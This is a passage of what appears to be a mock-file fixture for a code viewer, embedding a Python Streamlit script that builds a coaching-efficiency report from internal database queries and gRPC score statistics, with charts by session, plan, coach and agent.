theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus criteria efficiency\\", expanded=True):\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(criteria_efficiency_df)\\n    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus scorecard template efficiency\\", expanded=True):\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(template_efficiency_df)\\n    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coach efficiency\\", expanded=True):\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(coach_efficiency_df)\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n\\nwith st.expander(\\"Agent efficiency\\", expanded=True):\\n    # Agent efficiency chart.\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(agent_efficiency_df)\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n","originalContents":"export const mockFile = \`downloadFileimport argparse\\nimport collections\\nimport datetime\\nimport grpc\\nimport itertools\\nimport numpy as np\\nimport os\\nimport pandas as pd\\nimport pandas.io.sql as sqlio\\nimport subprocess\\nimport time\\nimport streamlit as st\\nfrom collections import defaultdict\\nimport plotly.express as px\\n\\nfrom google.protobuf import timestamp_pb2\\n\\nfrom cresta.v1.analytics import analytics_service_pb2\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\nfrom cresta.v1.analytics import common_pb2\\nfrom cresta.v1.analytics import qa_stats_pb2\\nfrom cresta.v1.user import user_pb2\\n\\nfrom greyparrot.common import Customer\\nfrom greyparrot.conversations.db import ConversationsDBConn\\n\\nst.write(\\"\\"\\"# Coaching Report #\\"\\"\\")\\n\\nport_forward_ports_and_processes = {\\n    'chat-prod': (8081, None),\\n    'voice-prod': (8082, None),\\n    'us-west-2-prod': (8083, None),\\n}\\n\\nall_customers = [{\\n    'display_name': f'{display_name} ({customer_name})',\\n    'name': customer_name,\\n    'customer_id': customer_id,\\n    'profile_id': profile_id,\\n    'prod_env_name': prod_env_name,\\n    'domain': domain,\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\n    list(\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\n             c.prod_env_name, c.domain) for c in Customer.all()\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\n\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\n    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"\\n\\n@st.cache_data\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\n    if not customer_display_name:\\n        return None\\n\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\n    conn = db_conn.session.connection().connection\\n\\n    user_id_name = {}\\n    scorecard_template_id_name_map = {}\\n    template_criteria_id_name_map = {}\\n    coaching_sessions = []\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                coaching_plans.resource_id as coaching_plan_id,\\n                cu.full_name as creator_user_name,\\n                cu.user_id as creator_user_id,\\n                COALESCE(su.full_name, '') as submitter_user_name,\\n                COALESCE(su.user_id, '') as submitter_user_id,\\n                coaching_sessions.session_at as session_time,\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\n                au.full_name as agent_user_name,\\n                au.user_id as agent_user_id,\\n                coaching_sessions.resource_id as session_id,\\n                coaching_sessions.usecase_id as usecase\\n            FROM director.coaching_plans \\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for session_note in rows:\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\n                focus_criteria = session_note[6]\\n                for criteria in focus_criteria:\\n                    ids = criteria.split('/')\\n                    scorecard_template_id_name_map[ids[0]] = ''\\n                    coaching_sessions.append({\\n                        \\"session_id\\": session_note[9],\\n                        \\"usecase\\": session_note[10],\\n                        \\"coaching_plan_id\\": session_note[0],\\n                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                        \\"creator_user_name\\": session_note[1],\\n                        \\"creator_user_id\\": session_note[2],\\n                        \\"submitter_user_name\\": session_note[3],\\n                        \\"submitter_user_id\\": session_note[4],\\n                        \\"session_time\\": session_note[5],\\n                        \\"focus_criteria_template_id\\": ids[0],\\n                        \\"focus_criteria_id\\": ids[1],\\n                        \\"agent_user_name\\": session_note[7],\\n                        \\"agent_user_id\\": session_note[8],\\n                        \\"before_score\\": -1,\\n                        \\"before_convo_count\\": 0,\\n                        \\"after_score\\": -1,\\n                        \\"after_convo_count\\": 0,\\n                    })\\n            else:\\n                coaching_sessions.append({\\n                    \\"session_id\\": session_note[9],\\n                    \\"coaching_plan_id\\": session_note[0],\\n                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                    \\"creator_user_name\\": session_note[1],\\n                    \\"creator_user_id\\": session_note[2],\\n                    \\"submitter_user_name\\": session_note[3],\\n                    \\"submitter_user_id\\": session_note[4],\\n                    \\"session_time\\": session_note[5],\\n                    \\"focus_criteria_template_id\\": '',\\n                    \\"focus_criteria_id\\": '',\\n                    \\"agent_user_name\\": session_note[7],\\n                    \\"agent_user_id\\": session_note[8],\\n                    \\"before_score\\": -1,\\n                    \\"before_convo_count\\": 0,\\n                    \\"after_score\\": -1,\\n                    \\"after_convo_count\\": 0,\\n                })\\n            user_id_name[session_note[2]] = session_note[1]\\n            user_id_name[session_note[4]] = session_note[3]\\n            user_id_name[session_note[8]] = session_note[7]\\n\\n    if len(scorecard_template_id_name_map) == 0:\\n        return coaching_sessions\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                resource_id as scorecard_template_id,\\n                title as title,\\n                template as template\\n            FROM director.scorecard_templates \\n            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for template in rows:\\n            scorecard_template_id_name_map[template[0]] = template[1]\\n            for items in template[2].get('items', []):\\n                if 'identifier' in items and 'displayName' in items:\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\n                if 'items' in items:\\n                    for criteria_items in items['items']:\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\n\\n        for session in coaching_sessions:\\n            if session['focus_criteria_template_id'] != '':\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\n        \\n    return coaching_sessions\\n\\n\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\n    if not coaching_sessions:\\n        return None\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")\\n\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\n        process = subprocess.Popen([\\n            'kubectl',\\n            f'--context={customer[\\"prod_env_name\\"]}',\\n            '--namespace=cresta-api',\\n            'port-forward',\\n            'services/insights-server',\\n            f'{port_number}:80',\\n        ])\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\n        time.sleep(2)\\n\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\n\\n    with grpc.insecure_channel(\\n            f'localhost:{port_number}',\\n            options=[\\n                ('grpc.max_receive_message_length', 50000000),\\n            ],\\n    ) as channel:\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\n        for coaching_session_idx in range(len(coaching_sessions)):\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")\\n            coaching_session = coaching_sessions[coaching_session_idx]\\n            if coaching_session['focus_criteria_id'] != '':\\n                before_score, before_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\n                after_score, after_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\n                coaching_session['before_score'] = before_score\\n                coaching_session['before_convo_count'] = before_convo_count\\n                coaching_session['after_score'] = after_score\\n                coaching_session['after_convo_count'] = after_convo_count\\n\\n    progress.empty()\\n    return coaching_sessions\\n\\n@st.cache_data\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\n    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'\\n    agent_user_name = f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'\\n    try:\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\n            parent=parent,\\n            read_from_clickhouse=True,\\n            filter_by_time_range=common_pb2.TimeRange(\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\n            ),\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\n                    users=[user_pb2.User(name=agent_user_name)],\\n                    criterion_identifiers=[criteria_id],\\n                ),\\n            group_by_attribute_types=[\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\n            ],\\n        )\\n        response = _stub.RetrieveQAScoreStats(\\n            request,\\n            metadata=auth_metadata,\\n            timeout=600)\\n    except Exception as e:\\n        print(f'Error querying Insights Server: {e}')\\n        return None\\n    if response.qa_score_result.total_conversation_count == 0:\\n        return -1, 0\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\n\\n\\n##############################################################################################\\n\\ncustomer_display_name = st.selectbox(\\n    'Select a customer:',\\n    [c['display_name'] for c in all_customers])\\n\\nnum_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)\\n\\nnum_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)\\n\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\n\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\n\\nwith st.expander(\\"All loaded session notes\\", expanded=True):\\n    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")\\n    session_df = pd.DataFrame(coaching_sessions)\\n    st.dataframe(session_df)\\n    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\n\\nwith st.expander(\\"Session notes with valid scores\\", expanded=True):\\n    # Coach efficiency chart.\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\n    st.dataframe(valid_session_df)\\n \\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\n    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")\\n    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")\\n\\ndef weighted_effiency(df):\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\n    num_sessions =  len(df['session_id'].unique())\\n    return pd.Series({\\n        'efficiency': efficiency,\\n        'num_sessions': num_sessions\\n    })\\n\\nwith st.expander(\\"Session efficiency\\", expanded=True):\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(session_efficiency_df)\\n    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coaching plan efficiency\\", expanded=True):\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(plan_efficiency_df)\\n    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus criteria efficiency\\", expanded=True):\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(criteria_efficiency_df)\\n    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus scorecard template efficiency\\", expanded=True):\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(template_efficiency_df)\\n    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coach efficiency\\", expanded=True):\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(coach_efficiency_df)\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n\\nwith st.expander(\\"Agent efficiency\\", expanded=True):\\n    # Agent efficiency chart.\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(agent_efficiency_df)\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n","detailedLines":[{"text":"export const mockFile = \`downloadFileimport argparse","lineNumber":1},{"text":"import collections","lineNumber":2},{"text":"import datetime","lineNumber":3},{"text":"import grpc","lineNumber":4},{"text":"import itertools","lineNumber":5},{"text":"import numpy as np","lineNumber":6},{"text":"import os","lineNumber":7},{"text":"import pandas as pd","lineNumber":8},{"text":"import pandas.io.sql as sqlio","lineNumber":9},{"text":"import subprocess","lineNumber":10},{"text":"import time","lineNumber":11},{"text":"import streamlit as st","lineNumber":12},{"text":"from collections import defaultdict","lineNumber":13},{"text":"import plotly.express as px","lineNumber":14},{"lineNumber":15},{"text":"from google.protobuf import timestamp_pb2","lineNumber":16},{"lineNumber":17},{"text":"from cresta.v1.analytics import analytics_service_pb2","lineNumber":18},{"text":"from cresta.v1.analytics import analytics_service_pb2_grpc","lineNumber":19},{"text":"from cresta.v1.analytics import common_pb2","lineNumber":20},{"text":"from cresta.v1.analytics import qa_stats_pb2","lineNumber":21},{"text":"from cresta.v1.user import user_pb2","lineNumber":22},{"lineNumber":23},{"text":"from greyparrot.common import Customer","lineNumber":24},{"text":"from greyparrot.conversations.db import ConversationsDBConn","lineNumber":25},{"lineNumber":26},{"text":"st.write(\\"\\"\\"# Coaching Report #\\"\\"\\")","lineNumber":27},{"lineNumber":28},{"text":"port_forward_ports_and_processes = {","lineNumber":29},{"text":"    'chat-prod': (8081, None),","lineNumber":30},{"text":"    'voice-prod': (8082, None),","lineNumber":31},{"text":"    'us-west-2-prod': (8083, None),","lineNumber":32},{"text":"}","lineNumber":33},{"lineNumber":34},{"text":"all_customers = [{","lineNumber":35},{"text":"    'display_name': f'{display_name} ({customer_name})',","lineNumber":36},{"text":"    'name': customer_name,","lineNumber":37},{"text":"    'customer_id': customer_id,","lineNumber":38},{"text":"    'profile_id': profile_id,","lineNumber":39},{"text":"    'prod_env_name': prod_env_name,","lineNumber":40},{"text":"    'domain': domain,","lineNumber":41},{"text":"} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(","lineNumber":42},{"text":"    list(","lineNumber":43},{"text":"        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,","lineNumber":44},{"text":"             c.prod_env_name, c.domain) for c in Customer.all()","lineNumber":45},{"text":"            if c.prod_env_name in port_forward_ports_and_processes.keys())))]","lineNumber":46},{"lineNumber":47},{"text":"def build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):","lineNumber":48},{"text":"    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"","lineNumber":49},{"lineNumber":50},{"text":"@st.cache_data","lineNumber":51},{"text":"def load_coaching_data(customer_display_name, num_last_days, num_days):","lineNumber":52},{"text":"    if not customer_display_name:","lineNumber":53},{"text":"        return None","lineNumber":54},{"lineNumber":55},{"text":"    current_datetime = datetime.datetime.now(datetime.timezone.utc)","lineNumber":56},{"text":"    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)","lineNumber":57},{"text":"    last_session_days = current_datetime - datetime.timedelta(days=num_days)","lineNumber":58},{"lineNumber":59},{"text":"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)","lineNumber":60},{"lineNumber":61},{"text":"    db_conn = ConversationsDBConn.from_customer_name(customer['name'])","lineNumber":62},{"text":"    conn = db_conn.session.connection().connection","lineNumber":63},{"lineNumber":64},{"text":"    user_id_name = {}","lineNumber":65},{"text":"    scorecard_template_id_name_map = {}","lineNumber":66},{"text":"    template_criteria_id_name_map = {}","lineNumber":67},{"text":"    coaching_sessions = []","lineNumber":68},{"lineNumber":69},{"text":"    with conn.cursor() as cursor:","lineNumber":70},{"text":"        cursor.execute(f\\"\\"\\"","lineNumber":71},{"text":"            SELECT","lineNumber":72},{"text":"                coaching_plans.resource_id as coaching_plan_id,","lineNumber":73},{"text":"                cu.full_name as creator_user_name,","lineNumber":74},{"text":"                cu.user_id as creator_user_id,","lineNumber":75},{"text":"                COALESCE(su.full_name, '') as submitter_user_name,","lineNumber":76},{"text":"                COALESCE(su.user_id, '') as submitter_user_id,","lineNumber":77},{"text":"                coaching_sessions.session_at as session_time,","lineNumber":78},{"text":"                coaching_plans.focus_criteria_ids as focus_behaviors,","lineNumber":79},{"text":"                au.full_name as agent_user_name,","lineNumber":80},{"text":"                au.user_id as agent_user_id,","lineNumber":81},{"text":"                coaching_sessions.resource_id as session_id,","lineNumber":82},{"text":"                coaching_sessions.usecase_id as usecase","lineNumber":83},{"text":"            FROM director.coaching_plans ","lineNumber":84},{"text":"                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id","lineNumber":85},{"text":"                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id","lineNumber":86},{"text":"                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id","lineNumber":87},{"text":"                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id","lineNumber":88},{"text":"            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'","lineNumber":89},{"text":"                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'","lineNumber":90},{"text":"            \\"\\"\\")","lineNumber":91},{"text":"        ","lineNumber":92},{"text":"        rows = cursor.fetchall()","lineNumber":93},{"text":"        for session_note in rows:","lineNumber":94},{"text":"            if session_note[6] is not None and len(session_note[6]) > 0:","lineNumber":95},{"text":"                focus_criteria = session_note[6]","lineNumber":96},{"text":"                for criteria in focus_criteria:","lineNumber":97},{"text":"                    ids = criteria.split('/')","lineNumber":98},{"text":"                    scorecard_template_id_name_map[ids[0]] = ''","lineNumber":99},{"text":"                    coaching_sessions.append({","lineNumber":100},{"text":"                        \\"session_id\\": session_note[9],","lineNumber":101},{"text":"                        \\"usecase\\": session_note[10],","lineNumber":102},{"text":"                        \\"coaching_plan_id\\": session_note[0],","lineNumber":103},{"text":"                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),","lineNumber":104},{"text":"                        \\"creator_user_name\\": session_note[1],","lineNumber":105},{"text":"                        \\"creator_user_id\\": session_note[2],","lineNumber":106},{"text":"                        \\"submitter_user_name\\": session_note[3],","lineNumber":107},{"text":"                        \\"submitter_user_id\\": session_note[4],","lineNumber":108},{"text":"                        \\"session_time\\": session_note[5],","lineNumber":109},{"text":"                        \\"focus_criteria_template_id\\": ids[0],","lineNumber":110},{"text":"                        \\"focus_criteria_id\\": ids[1],","lineNumber":111},{"text":"                        \\"agent_user_name\\": session_note[7],","lineNumber":112},{"text":"                        \\"agent_user_id\\": session_note[8],","lineNumber":113},{"text":"                        \\"before_score\\": -1,","lineNumber":114},{"text":"                        \\"before_convo_count\\": 0,","lineNumber":115},{"text":"                        \\"after_score\\": -1,","lineNumber":116},{"text":"                        \\"after_convo_count\\": 0,","lineNumber":117},{"text":"                    })","lineNumber":118},{"text":"            else:","lineNumber":119},{"text":"                coaching_sessions.append({","lineNumber":120},{"text":"                    \\"session_id\\": session_note[9],","lineNumber":121},{"text":"                    \\"coaching_plan_id\\": session_note[0],","lineNumber":122},{"text":"                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),","lineNumber":123},{"text":"                    \\"creator_user_name\\": session_note[1],","lineNumber":124},{"text":"                    \\"creator_user_id\\": session_note[2],","lineNumber":125},{"text":"                    \\"submitter_user_name\\": session_note[3],","lineNumber":126},{"text":"                    \\"submitter_user_id\\": session_note[4],","lineNumber":127},{"text":"                    \\"session_time\\": session_note[5],","lineNumber":128},{"text":"                    \\"focus_criteria_template_id\\": '',","lineNumber":129},{"text":"                    \\"focus_criteria_id\\": '',","lineNumber":130},{"text":"                    \\"agent_user_name\\": session_note[7],","lineNumber":131},{"text":"                    \\"agent_user_id\\": session_note[8],","lineNumber":132},{"text":"                    \\"before_score\\": -1,","lineNumber":133},{"text":"                    \\"before_convo_count\\": 0,","lineNumber":134},{"text":"                    \\"after_score\\": -1,","lineNumber":135},{"text":"                    \\"after_convo_count\\": 0,","lineNumber":136},{"text":"                })","lineNumber":137},{"text":"            user_id_name[session_note[2]] = session_note[1]","lineNumber":138},{"text":"            user_id_name[session_note[4]] = session_note[3]","lineNumber":139},{"text":"            user_id_name[session_note[8]] = session_note[7]","lineNumber":140},{"lineNumber":141},{"text":"    if len(scorecard_template_id_name_map) == 0:","lineNumber":142},{"text":"        return coaching_sessions","lineNumber":143},{"lineNumber":144},{"text":"    with conn.cursor() as cursor:","lineNumber":145},{"text":"        cursor.execute(f\\"\\"\\"","lineNumber":146},{"text":"            SELECT","lineNumber":147},{"text":"                resource_id as scorecard_template_id,","lineNumber":148},{"text":"                title as title,","lineNumber":149},{"text":"                template as template","lineNumber":150},{"text":"            FROM director.scorecard_templates ","lineNumber":151},{"text":"            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')","lineNumber":152},{"text":"            \\"\\"\\")","lineNumber":153},{"text":"        ","lineNumber":154},{"text":"        rows = cursor.fetchall()","lineNumber":155},{"text":"        for template in rows:","lineNumber":156},{"text":"            scorecard_template_id_name_map[template[0]] = template[1]","lineNumber":157},{"text":"            for items in template[2].get('items', []):","lineNumber":158},{"text":"                if 'identifier' in items and 'displayName' in items:","lineNumber":159},{"text":"                    template_criteria_id_name_map[items['identifier']] = items['displayName']","lineNumber":160},{"text":"                if 'items' in items:","lineNumber":161},{"text":"                    for criteria_items in items['items']:","lineNumber":162},{"text":"                        if 'identifier' in criteria_items and 'displayName' in criteria_items:","lineNumber":163},{"text":"                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']","lineNumber":164},{"lineNumber":165},{"text":"        for session in coaching_sessions:","lineNumber":166},{"text":"            if session['focus_criteria_template_id'] != '':","lineNumber":167},{"text":"                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]","lineNumber":168},{"text":"            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:","lineNumber":169},{"text":"                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]","lineNumber":170},{"text":"        ","lineNumber":171},{"text":"    return coaching_sessions","lineNumber":172},{"lineNumber":173},{"lineNumber":174},{"text":"def load_scores_data(customer_display_name, coaching_sessions, num_days):","lineNumber":175},{"text":"    if not coaching_sessions:","lineNumber":176},{"text":"        return None","lineNumber":177},{"lineNumber":178},{"text":"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)","lineNumber":179},{"lineNumber":180},{"text":"    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")","lineNumber":181},{"lineNumber":182},{"text":"    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]","lineNumber":183},{"text":"    if port_forward_process is None or port_forward_process.poll() is not None:","lineNumber":184},{"text":"        process = subprocess.Popen([","lineNumber":185},{"text":"            'kubectl',","lineNumber":186},{"text":"            f'--context={customer[\\"prod_env_name\\"]}',","lineNumber":187},{"text":"            '--namespace=cresta-api',","lineNumber":188},{"text":"            'port-forward',","lineNumber":189},{"text":"            'services/insights-server',","lineNumber":190},{"text":"            f'{port_number}:80',","lineNumber":191},{"text":"        ])","lineNumber":192},{"text":"        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)","lineNumber":193},{"text":"        time.sleep(2)","lineNumber":194},{"lineNumber":195},{"text":"    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')","lineNumber":196},{"text":"    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'","lineNumber":197},{"text":"    auth_metadata = [['authorization', f'ApiKey {api_key}']]","lineNumber":198},{"lineNumber":199},{"text":"    with grpc.insecure_channel(","lineNumber":200},{"text":"            f'localhost:{port_number}',","lineNumber":201},{"text":"            options=[","lineNumber":202},{"text":"                ('grpc.max_receive_message_length', 50000000),","lineNumber":203},{"text":"            ],","lineNumber":204},{"text":"    ) as channel:","lineNumber":205},{"text":"        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)","lineNumber":206},{"text":"        for coaching_session_idx in range(len(coaching_sessions)):","lineNumber":207},{"text":"            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")","lineNumber":208},{"text":"            coaching_session = coaching_sessions[coaching_session_idx]","lineNumber":209},{"text":"            if coaching_session['focus_criteria_id'] != '':","lineNumber":210},{"text":"                before_score, before_convo_count = query_agent_criteria_score(","lineNumber":211},{"text":"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])","lineNumber":212},{"text":"                after_score, after_convo_count = query_agent_criteria_score(","lineNumber":213},{"text":"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))","lineNumber":214},{"text":"                coaching_session['before_score'] = before_score","lineNumber":215},{"text":"                coaching_session['before_convo_count'] = before_convo_count","lineNumber":216},{"text":"                coaching_session['after_score'] = after_score","lineNumber":217},{"text":"                coaching_session['after_convo_count'] = after_convo_count","lineNumber":218},{"lineNumber":219},{"text":"    progress.empty()","lineNumber":220},{"text":"    return coaching_sessions","lineNumber":221},{"lineNumber":222},{"text":"@st.cache_data","lineNumber":223},{"text":"def query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):","lineNumber":224},{"text":"    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'","lineNumber":225},{"text":"    agent_user_name = 